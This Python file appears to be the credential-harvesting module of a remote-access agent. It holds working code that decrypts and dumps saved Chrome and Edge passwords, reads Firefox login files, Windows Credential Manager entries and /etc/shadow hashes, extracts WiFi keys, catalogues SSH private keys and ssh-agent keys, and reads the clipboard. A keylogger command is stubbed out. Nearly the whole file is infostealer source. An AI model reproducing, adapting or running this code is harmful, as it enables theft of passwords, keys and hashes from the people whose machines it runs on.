# agent/modules/credentials.py
import os
import json
import base64
import sqlite3
import platform
import subprocess
from typing import Dict, Any, List, Optional
try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False


class Credentials:
    """Credential harvesting module"""
    
    def __init__(self, agent):
        self.agent = agent
        self.commands = {
            'dump_browser': self.dump_browser_passwords,
            'dump_system': self.dump_system_credentials,
            'dump_wifi': self.dump_wifi_passwords,
            'dump_ssh': self.dump_ssh_keys,
            'dump_hash': self.dump_password_hashes,
            'keylog': self.keylogger,
            'clipboard': self.get_clipboard
        }
    
    def execute(self, command: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute credential command"""
        if command in self.commands:
            try:
                result = self.commands[command](parameters)
                return {'success': True, 'result': result}
            except Exception as e:
                return {'success': False, 'error': str(e)}
        else:
            return {'success': False, 'error': f'Unknown command: {command}'}
    
    def dump_browser_passwords(self, params: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Dump browser saved passwords"""
        browser = params.get('browser', 'all')
        credentials = []
        
        if platform.system() == 'Windows':
            if browser in ['chrome', 'all']:
                credentials.extend(self._dump_chrome_windows())
            if browser in ['firefox', 'all']:
                credentials.extend(self._dump_firefox())
            if browser in ['edge', 'all']:
                credentials.extend(self._dump_edge_windows())
        else:
            if browser in ['chrome', 'all']:
                credentials.extend(self._dump_chrome_linux())
            if browser in ['firefox', 'all']:
                credentials.extend(self._dump_firefox())
        
        return credentials
    
    def _dump_chrome_windows(self) -> List[Dict[str, Any]]:
        """Dump Chrome passwords on Windows"""
        credentials = []
        
        # Chrome password database location
        local_state_path = os.path.join(
            os.environ['USERPROFILE'],
            r'AppData\Local\Google\Chrome\User Data\Local State'
        )
        
        login_data_path = os.path.join(
            os.environ['USERPROFILE'],
            r'AppData\Local\Google\Chrome\User Data\Default\Login Data'
        )
        
        if not os.path.exists(login_data_path):
            return credentials
        
        try:
            # Copy database to temp location
            import shutil
            import tempfile
            
            temp_db = tempfile.mktemp()
            shutil.copy2(login_data_path, temp_db)
            
            # Get encryption key
            key = self._get_chrome_key(local_state_path)
            
            # Connect to database
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Query passwords
            cursor.execute("""
                SELECT origin_url, username_value, password_value, date_created 
                FROM logins
            """)
            
            for row in cursor.fetchall():
                url, username, encrypted_password, date_created = row
                
                # Decrypt password
                if key and encrypted_password:
                    password = self._decrypt_chrome_password(encrypted_password, key)
                else:
                    password = ""
                
                credentials.append({
                    'browser': 'Chrome',
                    'url': url,
                    'username': username,
                    'password': password,
                    'lastUsed': date_created
                })
            
            conn.close()
            os.remove(temp_db)
            
        except Exception as e:
            pass
        
        return credentials
    
    def _get_chrome_key(self, local_state_path: str) -> Optional[bytes]:
        """Get Chrome encryption key"""
        if not CRYPTO_AVAILABLE:
            return None
        
        try:
            with open(local_state_path, 'r') as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(
                local_state['os_crypt']['encrypted_key']
            )[5:]  # Remove 'DPAPI' prefix
            
            # Decrypt key using Windows DPAPI
            if platform.system() == 'Windows':
                import win32crypt
                key = win32crypt.CryptUnprotectData(
                    encrypted_key, None, None, None, 0
                )[1]
                return key
            
        except:
            pass
        
        return None
    
    def _decrypt_chrome_password(self, encrypted: bytes, key: bytes) -> str:
        """Decrypt Chrome password"""
        if not CRYPTO_AVAILABLE:
            return ""
        
        try:
            # Chrome v80+ uses AES-GCM
            nonce = encrypted[3:15]
            ciphertext = encrypted[15:-16]
            tag = encrypted[-16:]
            
            cipher = Cipher(
                algorithms.AES(key),
                modes.GCM(nonce, tag),
                backend=default_backend()
            )
            
            decryptor = cipher.decryptor()
            password = decryptor.update(ciphertext) + decryptor.finalize()
            
            return password.decode('utf-8')
            
        except:
            # Try older DPAPI method
            if platform.system() == 'Windows':
                try:
                    import win32crypt
                    password = win32crypt.CryptUnprotectData(
                        encrypted, None, None, None, 0
                    )[1]
                    return password.decode('utf-8')
                except:
                    pass
        
        return ""
    
    def _dump_chrome_linux(self) -> List[Dict[str, Any]]:
        """Dump Chrome passwords on Linux"""
        credentials = []
        
        # Chrome password database location
        config_dir = os.path.expanduser('~/.config/google-chrome/Default')
        login_data_path = os.path.join(config_dir, 'Login Data')
        
        if not os.path.exists(login_data_path):
            # Try Chromium
            config_dir = os.path.expanduser('~/.config/chromium/Default')
            login_data_path = os.path.join(config_dir, 'Login Data')
        
        if not os.path.exists(login_data_path):
            return credentials
        
        try:
            # Copy database to temp location
            import shutil
            import tempfile
            
            temp_db = tempfile.mktemp()
            shutil.copy2(login_data_path, temp_db)
            
            # Connect to database
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Query passwords
            cursor.execute("""
                SELECT origin_url, username_value, password_value, date_created 
                FROM logins
            """)
            
            for row in cursor.fetchall():
                url, username, encrypted_password, date_created = row
                
                # On Linux, passwords might be stored in gnome-keyring
                # This is a simplified version
                password = encrypted_password.decode('utf-8', errors='ignore')
                
                credentials.append({
                    'browser': 'Chrome/Chromium',
                    'url': url,
                    'username': username,
                    'password': password,
                    'lastUsed': date_created
                })
            
            conn.close()
            os.remove(temp_db)
            
        except Exception as e:
            pass
        
        return credentials
    
    def _dump_firefox(self) -> List[Dict[str, Any]]:
        """Dump Firefox passwords"""
        credentials = []
        
        # Find Firefox profile
        if platform.system() == 'Windows':
            profiles_dir = os.path.join(
                os.environ['APPDATA'],
                'Mozilla', 'Firefox', 'Profiles'
            )
        else:
            profiles_dir = os.path.expanduser('~/.mozilla/firefox')
        
        if not os.path.exists(profiles_dir):
            return credentials
        
        # Find default profile
        for profile in os.listdir(profiles_dir):
            if '.default' in profile:
                profile_path = os.path.join(profiles_dir, profile)
                
                # Check for password files
                key_db = os.path.join(profile_path, 'key4.db')
                logins_json = os.path.join(profile_path, 'logins.json')
                
                if os.path.exists(logins_json):
                    try:
                        with open(logins_json, 'r') as f:
                            logins_data = json.load(f)
                        
                        for login in logins_data.get('logins', []):
                            credentials.append({
                                'browser': 'Firefox',
                                'url': login.get('hostname', ''),
                                'username': login.get('encryptedUsername', ''),
                                'password': login.get('encryptedPassword', ''),
                                'lastUsed': login.get('timePasswordChanged', 0)
                            })
                            
                    except:
                        pass
        
        return credentials
    
    def _dump_edge_windows(self) -> List[Dict[str, Any]]:
        """Dump Edge passwords on Windows"""
        # Edge uses similar structure to Chrome
        credentials = []
        
        local_state_path = os.path.join(
            os.environ['USERPROFILE'],
            r'AppData\Local\Microsoft\Edge\User Data\Local State'
        )
        
        login_data_path = os.path.join(
            os.environ['USERPROFILE'],
            r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
        )
        
        if os.path.exists(login_data_path):
            # Use same method as Chrome
            chrome_creds = self._dump_chrome_windows()
            for cred in chrome_creds:
                cred['browser'] = 'Edge'
                credentials.append(cred)
        
        return credentials
    
    def dump_system_credentials(self, params: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Dump system credentials"""
        credentials = []
        
        if platform.system() == 'Windows':
            # Windows Credential Manager
            try:
                output = subprocess.check_output(
                    ['cmdkey', '/list'],
                    text=True,
                    stderr=subprocess.DEVNULL
                )
                
                current_target = None
                for line in output.split('\n'):
                    if 'Target:' in line:
                        current_target = line.split('Target:')[1].strip()
                    elif 'User:' in line and current_target:
                        user = line.split('User:')[1].strip()
                        credentials.append({
                            'type': 'Windows Credential Manager',
                            'service': current_target,
                            'username': user,
                            'domain': ''
                        })
                        current_target = None
                        
            except:
                pass
                
        else:
            # Check for stored passwords in common locations
            # /etc/shadow (requires root)
            if os.access('/etc/shadow', os.R_OK):
                try:
                    with open('/etc/shadow', 'r') as f:
                        for line in f:
                            parts = line.strip().split(':')
                            if len(parts) >= 2 and parts[1] not in ['*', '!', '!!']:
                                credentials.append({
                                    'type': 'System Account',
                                    'service': 'local',
                                    'username': parts[0],
                                    'hash': parts[1]
                                })
                except:
                    pass
        
        return credentials
    
    def dump_wifi_passwords(self, params: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Dump WiFi passwords"""
        credentials = []
        
        if platform.system() == 'Windows':
            try:
                # Get all profiles
                profiles = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profiles'],
                    text=True
                ).split('\n')
                
                for line in profiles:
                    if 'All User Profile' in line:
                        # Extract WiFi name
                        ssid = line.split(':')[1].strip()
                        
                        # Get password
                        try:
                            profile_info = subprocess.check_output(
                                ['netsh', 'wlan', 'show', 'profile', ssid, 'key=clear'],
                                text=True,
                                stderr=subprocess.DEVNULL
                            )
                            
                            password = ''
                            security = ''
                            
                            for info_line in profile_info.split('\n'):
                                if 'Key Content' in info_line:
                                    password = info_line.split(':')[1].strip()
                                elif 'Authentication' in info_line:
                                    security = info_line.split(':')[1].strip()
                            
                            credentials.append({
                                'ssid': ssid,
                                'password': password,
                                'security': security
                            })
                            
                        except:
                            pass
                            
            except:
                pass
                
        else:
            # Linux - check NetworkManager
            nm_dir = '/etc/NetworkManager/system-connections'
            
            if os.path.exists(nm_dir) and os.access(nm_dir, os.R_OK):
                for conn_file in os.listdir(nm_dir):
                    try:
                        with open(os.path.join(nm_dir, conn_file), 'r') as f:
                            content = f.read()
                            
                            ssid = ''
                            password = ''
                            security = ''
                            
                            for line in content.split('\n'):
                                if 'ssid=' in line:
                                    ssid = line.split('=')[1].strip()
                                elif 'psk=' in line:
                                    password = line.split('=')[1].strip()
                                elif 'key-mgmt=' in line:
                                    security = line.split('=')[1].strip()
                            
                            if ssid:
                                credentials.append({
                                    'ssid': ssid,
                                    'password': password,
                                    'security': security
                                })
                                
                    except:
                        pass
            
            # Also check wpa_supplicant
            wpa_conf = '/etc/wpa_supplicant/wpa_supplicant.conf'
            if os.path.exists(wpa_conf) and os.access(wpa_conf, os.R_OK):
                try:
                    with open(wpa_conf, 'r') as f:
                        content = f.read()
                        
                        # Parse networks
                        import re
                        networks = re.findall(
                            r'network=\{([^}]+)\}',
                            content,
                            re.MULTILINE | re.DOTALL
                        )
                        
                        for network in networks:
                            ssid_match = re.search(r'ssid="([^"]+)"', network)
                            psk_match = re.search(r'psk="([^"]+)"', network)
                            
                            if ssid_match:
                                credentials.append({
                                    'ssid': ssid_match.group(1),
                                    'password': psk_match.group(1) if psk_match else '',
                                    'security': 'WPA/WPA2'
                                })
                                
                except:
                    pass
        
        return credentials
    
    def dump_ssh_keys(self, params: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Dump SSH keys"""
        ssh_keys = []
        
        # Common SSH key locations
        ssh_dirs = [
            os.path.expanduser('~/.ssh'),
            '/etc/ssh'
        ]
        
        for ssh_dir in ssh_dirs:
            if os.path.exists(ssh_dir) and os.access(ssh_dir, os.R_OK):
                for filename in os.listdir(ssh_dir):
                    filepath = os.path.join(ssh_dir, filename)
                    
                    # Check for private keys
                    if filename.endswith(('rsa', 'dsa', 'ecdsa', 'ed25519')) and not filename.endswith('.pub'):
                        try:
                            with open(filepath, 'r') as f:
                                key_content = f.read()
                                
                                if 'PRIVATE KEY' in key_content:
                                    # Get public key if exists
                                    public_key = ''
                                    public_path = filepath + '.pub'
                                    if os.path.exists(public_path):
                                        with open(public_path, 'r') as pf:
                                            public_key = pf.read().strip()
                                    
                                    # Get key fingerprint
                                    try:
                                        output = subprocess.check_output(
                                            ['ssh-keygen', '-lf', filepath],
                                            text=True,
                                            stderr=subprocess.DEVNULL
                                        )
                                        fingerprint = output.split()[1]
                                    except:
                                        fingerprint = ''
                                    
                                    ssh_keys.append({
                                        'name': filename,
                                        'path': filepath,
                                        'type': self._get_key_type(key_content),
                                        'fingerprint': fingerprint,
                                        'public_key': public_key,
                                        'encrypted': 'ENCRYPTED' in key_content
                                    })
                                    
                        except:
                            pass
        
        # Check SSH agent
        if 'SSH_AUTH_SOCK' in os.environ:
            try:
                output = subprocess.check_output(
                    ['ssh-add', '-l'],
                    text=True,
                    stderr=subprocess.DEVNULL
                )
                
                for line in output.strip().split('\n'):
                    parts = line.split()
                    if len(parts) >= 3:
                        ssh_keys.append({
                            'name': 'SSH Agent Key',
                            'path': 'ssh-agent',
                            'type': parts[2],
                            'fingerprint': parts[1],
                            'public_key': '',
                            'encrypted': False
                        })
                        
            except:
                pass
        
        return ssh_keys
    
    def _get_key_type(self, key_content: str) -> str:
        """Determine SSH key type"""
        if 'RSA PRIVATE KEY' in key_content:
            return 'RSA'
        elif 'DSA PRIVATE KEY' in key_content:
            return 'DSA'
        elif 'EC PRIVATE KEY' in key_content:
            return 'ECDSA'
        elif 'OPENSSH PRIVATE KEY' in key_content:
            return 'Ed25519'
        else:
            return 'Unknown'
    
    def dump_password_hashes(self, params: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Dump password hashes"""
        hashes = []
        
        if platform.system() == 'Windows':
            # This would require more complex implementation
            # involving SAM database access
            pass
        else:
            # Unix/Linux - /etc/shadow
            if os.access('/etc/shadow', os.R_OK):
                try:
                    with open('/etc/shadow', 'r') as f:
                        for line in f:
                            parts = line.strip().split(':')
                            if len(parts) >= 2:
                                username = parts[0]
                                hash_value = parts[1]
                                
                                if hash_value and hash_value not in ['*', '!', '!!', 'x']:
                                    # Determine hash type
                                    if hash_value.startswith('$1$'):
                                        hash_type = 'MD5'
                                    elif hash_value.startswith('$2'):
                                        hash_type = 'Blowfish'
                                    elif hash_value.startswith('$5$'):
                                        hash_type = 'SHA-256'
                                    elif hash_value.startswith('$6$'):
                                        hash_type = 'SHA-512'
                                    else:
                                        hash_type = 'DES'
                                    
                                    hashes.append({
                                        'username': username,
                                        'hash': hash_value,
                                        'hashType': hash_type,
                                        'domain': 'local'
                                    })
                                    
                except:
                    pass
        
        return hashes
    
    def keylogger(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Start/stop keylogger (placeholder)"""
        action = params.get('action', 'status')
        
        # This is a placeholder - actual keylogging would require
        # platform-specific implementation and raises ethical concerns
        
        return {
            'action': action,
            'status': 'not_implemented',
            'message': 'Keylogger functionality not implemented'
        }
    
    def get_clipboard(self, params: Dict[str, Any]) -> str:
        """Get clipboard contents"""
        try:
            if platform.system() == 'Windows':
                # Windows clipboard
                import win32clipboard
                
                win32clipboard.OpenClipboard()
                data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                
                return data
                
            elif platform.system() == 'Darwin':
                # macOS
                output = subprocess.check_output(
                    ['pbpaste'],
                    text=True
                )
                return output
                
            else:
                # Linux - try multiple methods
                try:
                    # xclip
                    output = subprocess.check_output(
                        ['xclip', '-selection', 'clipboard', '-o'],
                        text=True,
                        stderr=subprocess.DEVNULL
                    )
                    return output
                except:
                    # xsel
                    try:
                        output = subprocess.check_output(
                            ['xsel', '--clipboard', '--output'],
                            text=True,
                            stderr=subprocess.DEVNULL
                        )
                        return output
                    except:
                        pass
                        
        except Exception as e:
            raise Exception(f"Failed to access clipboard: {e}")
        
        return ""
